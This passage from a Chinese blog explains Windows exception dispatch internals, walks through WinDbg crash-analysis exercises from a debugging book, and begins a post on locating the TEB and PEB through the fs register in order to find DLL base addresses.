nt!KiControlProtectionFaultShadow</span><br></pre></td></tr></table></figure>
<p>真正的IDT实际上是维护了多个门描述符（GD），每一项大小为8（64位为16），IDRT寄存器中保存着IDT的基地址，我们想具体找某个GD的话直接利用IDTR+8*offset即可。门描述符结构如下：</p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1g1ahvf68xrj30to0r2n0p.jpg" alt="image-20190321162653680"></p>
<p>GD大致由segment selector（段选择子）、offset（选定段后的偏移）、DPL（描述符特权级）、P（段是否存在）组成，在上一次的《windows调试艺术》中我已经详细的说明了如何通过该结构寻找GDT/IDT进而找到相应的内容，这里就不再展开说了。</p>
<p>当windows系统启动时，winLoad会在实模式下分配一块内存，使用CLI指令来禁止中断的使用，利用LIDT（Load IDT）指令将IDT表的位置和长度等信息交给CPU，接着系统恢复保护模式，这时的执行权交还给了入口函数，调用SIDT（set IDT）拿到之前存储的IDT的信息，并将其记录到PCR中，接着其他处理器也会进行初始化的操作，复制并修改自己的IDT，在一切准备就绪后，调用STL指令恢复中断的使用。调用的函数链如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winLoad -&gt; kiSystemStartup -&gt; kiInitializePcr -&gt;keStartAllProcessors -&gt; kiInitProcessors</span><br></pre></td></tr></table></figure>
<p>这里的PCR也就是上一次《windows调试艺术》中我们所说的Ring0下fs寄存器，我们可以使用内核调试状态下的windbg来查看相关的内容</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g1bdtjlm13j30kr09lmxd.jpg" alt="image-20190322105218697"></p>
<ul>
<li>第一个字段指向的是TIB，上一篇文章具体解释过了，我们重点关注的是第一个，exception的list的地址，也就是异常处理注册链表，是我们后面的重点。</li>
<li>Prcb是指Process Control Block，实际上在操作系统将IDT的信息交付给PCR的过程中，也会交给它。</li>
<li>IRQL也就是中断请求级别，0代表当前cpu的IRQL是内核态</li>
<li>IDT和GDT分别是前面提到的两个表的地址</li>
<li>TSS是任务段地址</li>
<li>CurrentThread也就是当前线程的EThread地址</li>
<li>NextThread是下一个准备执行的线程的地址</li>
<li>idleThread是一个优先级最低的线程，也可以把它叫做空闲线程，可以简单理解为它是个在“休息”的线程</li>
</ul>
<p>在上述过程进行完成之后，实际上我们的异常还是仅仅被“处理了一部分”而已，大多数IDT中记录的函数都只是对异常进行了包装和描述，之后还要采用异常分发机制来进一步进行异常处理。</p>
<h3 id="软件异常"><a href="#软件异常" class="headerlink" title="软件异常"></a>软件异常</h3><p>软件异常是由操作系统或应用程序产生的，它又包含了windows为我们定义好的异常处理和我们自己写的异常处理（各种编程语言中的try-catch结构）。这类异常追根溯源都是基于RaiseException这个用户态API和NtRaiseException的内核服务建立起来的。RaiseException的函数原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RaiseException</span><span class="params">(DWORD dwExceptionCode , DWORD dwExceptionFlags,DWORD nNumberofArguments,<span class="keyword">const</span> DWORD* lpArguments)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>dwException是异常状态码，可以在NtStatus.h中找到，应用程序也可以有自己的异常状态码</li>
<li>nNumberofArguments和lpArguments是用来定义异常的数据</li>
</ul>
<p>函数的功能十分简单，它会将异常的相关信息传入一个维护异常的结构，叫做EXCEPTION_RECORD，然后再去调用RtlRaiseException函数，该结构定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span></span><br><span class="line">  DWORD                    ExceptionCode;</span><br><span class="line">  DWORD                    ExceptionFlags;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span></span><br><span class="line">  PVOID                    ExceptionAddress;</span><br><span class="line">  DWORD                    NumberParameters;</span><br><span class="line">  ULONG_PTR                ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure>
<ul>
<li>ExceptionCode为异常状态码，可以在NtStatus.h中找到，RaiseException的dwException就对应此项</li>
<li>ExceptionFlags为异常的标志，16个bit中有一部分被拿出来当作标志位，包括像是8位的栈错误、1位的异常不可恢复等等，RaiseException的dwExceptionFlags对应此项</li>
<li>ExceptionRecord是指向下一个异常的指针</li>
<li>ExceptionAddress保存了异常的发生地址</li>
<li>NumberParameters是 ExceptionInformation数组中参数的个数，RaiseException的nNumberofArguments对应该项</li>
<li>ExceptionInformation也就是异常的描述信息，RaiseException的lpArguments对应该项</li>
</ul>
<p>之后调用的RltRaiseException会将当前的上下文保存到CONTEXT结构中，此后调用的函数会维护一个TrapFrame（即栈帧的基址）和异常的处理次数的标志，这里不再赘述，调用链如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户：RaiseException -&gt; RltRaiseException -&gt; NtRaiseException -&gt; KiRaiseException </span><br><span class="line">内核：RtlRaiseException -&gt; NtRaiseException -&gt; KiRaiseException</span><br></pre></td></tr></table></figure>
<h2 id="异常的的分发处理"><a href="#异常的的分发处理" class="headerlink" title="异常的的分发处理"></a>异常的的分发处理</h2><p>上面说到了硬件异常会通过IDT去调用异常处理例程（一般为KiTrap系列函数），而软件异常则是通过API的层层调用传递异常的信息，但这都是最基础的处理，实际上最后二者是殊途同归，都会走到KiDispatchException函数来进行异常的分发。</p>
<p>异常分发的简化流程图如下，笔者绘图能力有限……可以在看完后面的具体分析后大家自己加以完善。</p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g1bq3ehmyaj30my126n0p.jpg" alt="image-20190322175655873"></p>
<p>首先来看看KiDisPatchException函数的函数原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">KiDispatchException</span> <span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    IN PEXCEPTION_RECORD ExceptionRecord,</span></span></span><br><span class="line"><span class="function"><span class="params">    IN PKEXCEPTION_FRAME ExceptionFrame,</span></span></span><br><span class="line"><span class="function"><span class="params">    IN PKTRAP_FRAME TrapFrame,</span></span></span><br><span class="line"><span class="function"><span class="params">    IN KPROCESSOR_MODE PreviousMode,</span></span></span><br><span class="line"><span class="function"><span class="params">    IN BOOLEAN FirstChance</span></span></span><br><span class="line"><span class="function"><span class="params">    )</span></span></span><br></pre></td></tr></table></figure>
<p>ExceptionRecord也就是前面提的描述异常的结构，TrapFrame指向的结构用来描述发生异常时候的上下文，PreviousMode来说明异常来自Kernel还是User，最后的FirstChance用来表示异常是不是第一次被处理，实际上这些结构的集合就形成了一个虚拟的、完整的“异常”结构，再去进行下面的处理。</p>
<p>进入上图，首先就要对异常的涞源进行判断，右边是内核的异常，右边是用户的异常，我们一个一个来看</p>
<h3 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h3><p>但PreviousMode为0时，就会进入Kernel的异常分发，系统会维护一个KiDebugRoutine的函数，当内核的调试器启动时，它就帮我们把异常送往了内核调试器，而在未启动时，它只是一个“存根”函数（stub），返回一个False。这一步也就是图中的debug</p>
<p>当第一次debug返回False后会接着调用RtlDispatchException，函数的原型如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOLEAN <span class="title">RtlDispatchException</span><span class="params">(PEXCEPTION_RECORD ExceptionRecord,PCONTEXT ContextRecord)</span></span></span><br></pre></td></tr></table></figure>
<p>两个参数就是异常的结构和上下文结构了，可以拿Windbg查看，函数的大致操作如下：</p>
<ul>
<li>取异常登记链表的头指针</li>
<li>遍历异常登记记录</li>
<li>检查异常登记记录的有效性，有效则执行<ul>
<li>异常已处理，返回</li>
<li>没有处理，返回并继续遍历</li>
<li>如果是内嵌异常则进行特殊处理</li>
</ul>
</li>
</ul>
<p>取得异常登记链表的头指针的也就是上一篇文中提到的fs寄存器，fs:[00h]，fs指向了TEB结构，而TEB第一个offset又是一个TIB的结构，TIB的第一个也就是异常登记链表了</p>
<p>经过上面的处理后，如果异常已经被处理了那也就结束了，如果没有处理的话就会进行第二轮调试，重复上面的debug内容，如果依然是没有启用调试器的话就那么就会把这个异常当作UnhandleException，也就是我们常说的未处理异常，在kernel下未处理异常可是个大问题，毕竟这可是操作系统最最重要的也最最完善的内核，这样的未处理异常一般都不是小问题，为了防止异常引发更大的问题，这时候系统就会调用KeBugCheckEx中止系统运行显示蓝屏，并将导致异常的地址打印在屏幕上。</p>
<h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><p>当PreviousMode==1时就进入了用户态的异常分发，相较于Kernel来说，user的异常处理还包括了我们自己在编写程序的过程中用到的try catch，下面就具体来看看。</p>
<p>首先还是检查是否有调试器，具体的措施和Kernel相仿，不过找的函数是内核的DbgForwardException，这个函数涉及到了用户态的调试，以后要有机会还会单独写这个的知识点。简单点说就是找找用户态的调试器是不是要接手这个异常，如果成了就交给它处理，如果没有的话那就会通过KeUserExceptionDispatcher来找到KiUserExceptionDispatcher函数，要注意，此时已经返回到了用户态，且异常的相关信息（比如KTRAP_FRAME）已经被放入了用户态的栈上。之后会调用了RtlDispatchException（注意，该函数依然名字和作用都与Kernel的几乎相同，但是它是位于NTDLL的，而Kernel的则是位于NTOSKRNL）来遍历异常处理器的链表，但这次的链表又了“保底措施”，在链表的最末尾是UnhandledExceptionFilter（未处理异常过滤函数），一旦走到了这里，那就会出现“应用程序错误”的对话框并强制结束程序（之后会写这个函数的详细分析），异常也就算是处理完成了。</p>
<p>既然有了UnhandledExceptionFilter那岂不是所有的异常都会最终被直接处理了，那第二轮又是怎么回事？实际上如果在非调试状态下确实如此，用户态的异常如果在非调试状态下的话仅仅只有一轮的分发，而只有在调试状态下才会进行第二轮，再次判断调试器是否要接手异常。</p>
<p>##格蠹汇编练习题</p>
<p>下面是我选择的几个需要涉及到异常知识的《格蠹汇编》一书的课后题，通过这些实际的例子来看看异常在程序调试中的重要性，源文件大家可以自行百度下载。</p>
<h3 id="调试笔记之侦查广告插件"><a href="#调试笔记之侦查广告插件" class="headerlink" title="调试笔记之侦查广告插件"></a>调试笔记之侦查广告插件</h3><p>首先我们要windbg设置为windows的JIT（just in time）调试器，最简单的方法是在管理员权限下cmd进入windbg所在的目录，直接运行下边的命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WinDbg -I</span><br></pre></td></tr></table></figure>
<p>当然如今这种命令一步实现的可能性不大……因为我们大部分人的pc都是64位的windows10，并且还都装了vs，这种情况下我们会有x86和x64两种JIT默认，且默认都为vs的调试器，我们上面的操作仅仅是注册了其中的一种而已，这个时候我们就需要修改注册表了</p>
<p>我们进入regedit后找到下面的两个路径（分别是64位和32位的）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug</span><br></pre></td></tr></table></figure>
<p>里面有Auto和debuger两项，Auto的意思是在程序出错时是否会调用调试器，而Debuger则是保存了我们指定的调试器的路径，这里直接删除掉就好，接着分别在x86和x64的windbg目录下运行上面的命令就好了</p>
<p>再次打开程序发现直接打开了windbg</p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1g0yzbgb18wj315k072q4n.jpg" alt="image-20190311172343208"></p>
<p>我们可以看到Access violation，意思是访问违例，而下面的汇编代码就是具体的情况。可以看到执行的指令是将0赋予ecx的地址，当然只看这里我们还是看不出什么问题，接下来就进入正题了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.symfix 你的符号路径</span><br></pre></td></tr></table></figure>
<p>set symbol store path的意思，也就是从微软那边将需要的符号信息下载到你指定的路径，便于调试</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kPL</span><br></pre></td></tr></table></figure>
<p>k是用来展示给定的线程的栈帧并展示相关的信息，P能够显示每一个函数的所有的参数，包括参数的数据类型、名称和值，L的意思是隐藏source lines（源文件路径的意思），注意<strong>它们是大小写敏感的</strong></p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g0z32tvxr8j30po06k75m.jpg" alt="image-20190311193351960"></p>
<h3 id="修复因误杀而瘫痪的系统"><a href="#修复因误杀而瘫痪的系统" class="headerlink" title="修复因误杀而瘫痪的系统"></a>修复因误杀而瘫痪的系统</h3><p>这一章节没有实验，但有一些很重要的知识点，简单总结一下</p>
<p>作者的朋友电脑出了问题，最开始是菜单不见了，再之后仅仅是进入启动界面几秒就黑屏了，通过双机调试得到了以下的错误信息：</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g10z9pmlg9j30zi02wgng.jpg" alt="image-20190313105313024"></p>
<p>第一串数字是Stop code（停止码，可通过帮助文档查询），大括号中第一串是有关进程的信息，第二串是错误码，可以通过!error指令查询。在这里Stop Code的意思是系统进程终止，错误码的意思是对象不存在，也就是说尝试bug的原因是因为有些必要的东西没有了，我们利用db指令来查询一下进程的信息</p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g10zh4wr1jj30qc04a40u.jpg" alt="image-20190313110014109"></p>
<p>发现有windows Logon Process的信息，这是关系到用户登录的一个进程，在windows启动过程中，第一个创建的用户态进程是SMSS.exe（session manager subsystem），之后的进程关系如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SMSS.exe -&gt; winlogon.exe -&gt; explore.exe</span><br><span class="line">		 -&gt; CSRSS.exe</span><br></pre></td></tr></table></figure>
<p>而最后的explore是资源管理器，开始菜单就是它来维护的，而当SMSS创建这两个进程时，如果创建失败，就会进行bug check，如果有调试器的话就会调用系统中断连接到调试器，没有的话就会蓝屏重启。分析到这里，我们就有理由相信，电脑的重启很有可能是由于winlogon被删除而导致的。</p>
<p>但winlogon这么容易被删除吗？首先它作为系统文件，是有一定的保护机制的，其次，作为一个一直在运行的程序，它的虚拟内存文件不可能被直接删除。所谓虚拟内存文件是基于虚拟内存机制的一类文件，它有两种，一种是专用的页面文件，一般在磁盘的根目录，文件名叫做pagefile.sys；第二种是文件映射机制加载过的磁盘文件本身，比如用户态的dll文件和exe文件，加载后充当了虚拟内存文件的角色，而之后内存管理器会和文件系统会达成“协议”，不再允许删除该文件。这也就是病毒文件绞尽脑汁也要加载到内存的原因，一旦运行了，拿它在某种程度上就“无敌”了</p>
<p>作者根据电脑的故障时间进行了文件排查，最终将目光锁定在了一个名字中带有delay的反病毒软件的def文件，正是因为我们上面提到的问题，所以现在很多杀毒软件都支持“延时删除”的策略，但启动过程执行到SMSS.exe时会检查如下的注册表键执行操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager PendingFileRenameOperations</span><br></pre></td></tr></table></figure>
<p>该键的构造为srcFilePath\dstFilePath\0，即移动文件，当我们将dstFilePath设置为0时，也就会将src文件删除了。经过作者修改该文件，也就解决了问题。</p>
<p>由于书的年代过于久远所以采取了延时删除的策略，实际上在windwos8中已经引入了一种新的技术 – ELAM（Early Launch Anti-Malware），反病毒的驱动在得到微软的特殊数字签名（Microsoft Windows Early Launch Anti-malware Publisher）后可以在系统启动过程中优先加载并扫描接下来加载驱动的数字签名，如果判定为恶意代码的话就会在未启动前直接将其删除。</p>
<p>###拯救发疯的Windows 7</p>
<p>题目背景是作者的朋友电脑window7的操作系统崩溃，最后给了个dump出的文件.</p>
<p>Windbg载入dump文件</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g0y1elp2dej31d003y750.jpg" alt="image-20190310215025587"></p>
<p>可以很明显的看到报了个stack buffer overrun的提示，也就是说导致系统出问题的很可能是栈溢出，我们利用以下的命令查看一下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kn</span><br></pre></td></tr></table></figure>
<p>k是用来展示给定的线程的栈帧并展示相关的信息，n是显示栈的编号</p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g0z3ajhkifj30wu0fcn1t.jpg" alt="image-20190311194115824"></p>
<p>可以看到它调用了Werp开头的几个函数，全称是windows error report，也就是错误报告的意思，往下看有UnhandleExceptionFilter（未处理异常过滤函数），它是处理未处理异常的关键函数，同时也是系统终止掉一个进程前做最后处理的地方，应用程序错误（application error）和我们上面设置的JIT都是从这个函数发起的。根据栈回朔，往下就是引发这个未处理异常的函数了，也就是umpo模块里的某个函数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lmvm</span><br></pre></td></tr></table></figure>
<p>lm的意思是list load modules，v显示了详细的信息，m是要进行模块名称的匹配，在这的目的主要是看看是不是正常的（也就是官方的）一个模块，因为它之后就是错误处理了，所以我们有必要检查他一下，可以看到这个模块是没有问题的</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g0z3jshpabj31hi0d6diw.jpg" alt="image-20190311195009786"></p>
<p>继续看栈回朔，发现了问题，umpo模块中的SendPowerMessage函数的ret地址和其他函数的差距很大，并且windbg提醒我们这个地址不是在任何一个已知的模块中的，很有可能是发生了溢出错误，而report_gsfailure也正是cookie被覆盖所产生的异常处理信息（也就是GS机制，做pwn的应该是很熟悉了，这里不再多说）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd 009afb30-4</span><br></pre></td></tr></table></figure>
<p>此处地址为ebp-4，实际上也就是cookie，我们检查一下cookie的内容，cookie和父函数的值都是00640064，明显不正常</p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g0z40pgklzj30kw0283yj.jpg" alt="image-20190311200625444"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db 009afb30-204 L220</span><br></pre></td></tr></table></figure>
<p>我们查看该函数的变量空间来看看到底读取了什么导致了发生溢出，这里的204是由两个函数地址之差算出来的，记得还要减去cookie和ebp的大小（注意L要稍大一些，因为溢出了所以要想看到网站的读取信息就要多读几个字节）</p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g0z498c157j30y00q4af1.jpg" alt="image-20190311201435830"></p>
<p>可以看到确实是溢出了，而产生的原因就是因为c:\users\pictures\Sample Pictures\Desertddddd…d.jpg的文件路径字节数太多所导致的，我们手动改一下文件名就好了</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/15/windows调试艺术-LDR调试/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/15/windows调试艺术-LDR调试/" itemprop="url">windows调试艺术-LDR调试</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-15T11:18:06+08:00">
                2019-03-15
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Windows调试艺术/" itemprop="url" rel="index">
                    <span itemprop="name">Windows调试艺术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>文章在360的安全客上首发，搬运到自己博客上来，可以去安全客查看详细博文。</p>
<p>windows调试艺术主要是记录我自己学习的windows知识，并希望尽可能将这些东西在某些实际方面体现出来。</p>
<p>最近想写个自己的壳，但碰上了个大问题，如何定位在内存中各个DLL的加载基址呢？当然可以选择类似爆破的方式，但那未必太傻了，在翻阅了一些资料后发现了LDR链调试的方法，这实际上就是一种利用PEB关系链获得各个模块基址进而实现遍历其导出表的技术，通过这种技术我们可以轻易的在程序运行中获取到动态加载的api的实际地址进而实现各种各样的功能。恰好这又需要PEB、TEB等等的结构知识，就在此一并做个总结</p>
<p>ps：全过程均是32位程序，64位的offset略有不同</p>
<p>再ps：所有文中提到另外会写的……尽量不鸽（咕咕咕）</p>
<p>首先简单来看利用过程如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fs寄存器 -&gt; TEB -&gt; PEB -&gt; PEB_LDR_DATA	-&gt; LIST_ENTRY -&gt;LDR_DATA_TABLE_ENTRY -&gt; dll_base</span><br></pre></td></tr></table></figure>
<p>下面我们就一个一个的详细来分析一下</p>
<h2 id="fs寄存器"><a href="#fs寄存器" class="headerlink" title="fs寄存器"></a>fs寄存器</h2><p>我们常常可以看到类似这样的语句，从fs中拿到了某个值，这样的语句让逆向初学者一头雾水</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov 	eax,dowrd ptr fs:[0x30]</span><br></pre></td></tr></table></figure>
<p>我们可以试着用windbg来打印fs的值试试看它到底是个啥，r命令可以打印寄存器的值，而.formats可以把一个值的二进制啊十进制啊等各种形式都展示出来</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g13kfk9vw7j30lc0a4gml.jpg" alt="image-20190315163632847"></p>
<p>发现是0x3b，如果你处于内核态，那你会发现fs是0x30，而且不管你怎么试你会发现它就是这俩值，实际上，这是对应到GDTR的一个值，在intel手册中我们可以发现玄机，图中index是对应的GDT或LDT的第几项，RPL是特权级，TI的0和1分别表示为GDTR和LDTR </p>
<p><img src="https://ws1.sinaimg.cn/large/006tKfTcly1g13kgsj3doj30i607uacp.jpg" alt="image-20190315163744263"></p>
<p>我们这里就先来看看0x3b的情况，0x3b的16位如下，</p>
<table>
<thead>
<tr>
<th>0000000000111</th>
<th>0</th>
<th>11</th>
</tr>
</thead>
<tbody>
<tr>
<td>index  = 7</td>
<td>TI =0</td>
<td>RPL = 3</td>
</tr>
</tbody>
</table>
<p>说明这是个Ring3级别（也就是用户态），要在GDT里找第七项，当然这都是为了分析，实际上windbg为我们提供了dg命令，可以直接帮我们Display Selector</p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g13kxd2249j30qg05kq3i.jpg" alt="image-20190315165339569"></p>
<p>可以看到，7ffdc000实际上就是TEB，说明我们用户态的fs实际上就是TEB了，那刚才的fs:[30]也就是TEB结构体中的某个东西了，这个我们一会在说，先看看内核态的0x30又是什么情况</p>
<p>过程就不再重复了，只要将windbg切换到内核调试重复上面的过程即可，最后我们可以发现，指向的是一个叫做KPCR的结构，这个不再我们今天的讨论范围之内，只要知道它里面包含有TEB在内的很多重要的结构就行了</p>
<p>那我们又要想了，Ring3切换到Ring0应该是很常见的，为什么fs的指向会变化呢？实际上，只要是负责进入Ring0的函数，比如KiFastSystemCall、KiFastCallEntry 等等，都会涉及到对fs的操作，这里我们选取一段代码来实际看看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">808696a1 6a00            push    0</span><br><span class="line">808696a3 55              push    ebp</span><br><span class="line">808696a4 53              push    ebx</span><br><span class="line">808696a5 56              push    esi</span><br><span class="line">808696a6 57              push    edi</span><br><span class="line">808696a7 0fa0            push    fs   //原来的fs压栈保存</span><br><span class="line">808696a9 bb30000000      mov     ebx,30h</span><br><span class="line">808696ae 668ee3          mov     fs,bx   //将fs的值赋为30 </span><br><span class="line">808696b1 64ff3500000000  push    dword ptr fs:[0]</span><br><span class="line">808696b8 64c70500000000ffffffff mov dword ptr fs:[0],0FFFFFFFFh</span><br><span class="line">808696c3 648b3524010000  mov     esi,dword ptr fs:[124h]   </span><br><span class="line">808696ca ffb640010000    push    dword ptr [esi+140h]    </span><br><span class="line">808696d0 83ec48          sub     esp,48h                  </span><br><span class="line">808696d3 8b5c246c        mov     ebx,dword ptr [esp+6Ch]</span><br></pre></td></tr></table></figure>
<p>退出Ring0时也是类似的，这里选择KiSystemCallExit函数来看看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">80869945 8d6550          lea     esp,[ebp+50h]</span><br><span class="line">80869948 0fa1            pop     fs 				//恢复之前的fs值</span><br><span class="line">8086994a 8d6554          lea     esp,[ebp+54h]</span><br><span class="line">8086994d 5f              pop     edi</span><br><span class="line">8086994e 5e              pop     esi</span><br><span class="line">8086994f 5b              pop     ebx</span><br><span class="line">80869950 5d              pop     ebp</span><br><span class="line">80869951 66817c24088000  cmp     word ptr [esp+8],80h</span><br></pre></td></tr></table></figure>
<p>到这里我们对fs段寄存器的探索就到这里了，我们知道了在Ring3下它其实就是TEB，下一步我们就来探究TEB的相关内容</p>
<h2 id="TEB"><a href="#TEB" class="headerlink" title="TEB"></a>TEB</h2><p>TEB(Thread Environment Block，线程环境块)，说白了就是存放线程信息的一个结构体，每个线程维护着自己的一个TEB，且可以通过FS寄存器直接根据offset提取信息，很是方便。</p>
<p>我们可以用windbg的dt命令来显示TEB的情况，因为内容过多所以就不再一一列举了</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g13n3nz216j30qu0cw0vg.jpg" alt="image-20190315180854908"></p>
<p>我们来看几个比较重要的内容，首先就是offset为0的TIB</p>
<h3 id="TIB（Thread-Information-Block，线程信息块）"><a href="#TIB（Thread-Information-Block，线程信息块）" class="headerlink" title="TIB（Thread Information Block，线程信息块）"></a>TIB（Thread Information Block，线程信息块）</h3><p>我们同样可以利用windbg的dt来查看</p>
<p><img src="https://ws4.sinaimg.cn/large/006tKfTcly1g13n5xwqkyj30vm07wabl.jpg" alt="image-20190315181106466"></p>
<ul>
<li><p>ExceptionList，即指向_EXCEPTION_REGISTRATION_RECORD结构的指针链表，和SEH相关，涉及到异常处理</p>
</li>
<li><p>stackBase，该线程的stack地址</p>
</li>
<li>stackLimit，该线程的stack的limit，实际上就是栈的结束位置</li>
<li>self，即指向TEB的指针，在程序中看到的fs:[0x18]也就是拿到了TEB</li>
</ul>
<h3 id="EnvironmentPointer"><a href="#EnvironmentPointer" class="headerlink" title="EnvironmentPointer"></a>EnvironmentPointer</h3><p>0x1c为环境指针，指向的就是环境表，大家一定记得main函数有三个参数，第三个就是环境表的地址，环境一般都是以下的固定格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name = value</span><br></pre></td></tr></table></figure>
<p>比如我们在配置java的时候会添加一个JAVA_HOME的环境name，一个路径作为环境的value，环境表就是这样的环境变量组成的表</p>
<p>###_CLIENT_ID</p>
<p>0x20的offset指向了这个结构体，也同样dt查看一下</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g13nxkhgoej30ia03oq3b.jpg" alt="image-20190315183739878"></p>
<p>UniqueProcess是当前进程的PID，而UniqueThread这是当前线程的TID</p>
<p>###ProcessEnvironmentBlock</p>
<p>指向的是PEB，在程序中常见的ptr fs:[0x30]也就是拿到了PEB的地址，因为现在的windows已经有了地址随机化的功能，所以基本上都是用这种方式来拿到PEB的，有关PEB的东西我们接下来会细说</p>
